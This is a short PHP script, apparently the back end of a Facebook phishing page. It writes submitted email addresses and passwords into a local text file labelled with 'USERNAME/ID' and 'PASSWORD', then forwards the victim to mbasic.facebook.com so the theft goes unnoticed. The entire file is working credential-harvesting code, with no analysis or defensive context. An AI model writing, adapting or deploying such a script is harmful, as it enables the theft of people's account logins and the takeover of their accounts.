<?php

file_put_contents("hasil.txt", "USERNAME/ID: " . $_POST['email'] . " PASSWORD: " . $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://mbasic.facebook.com');
exit();
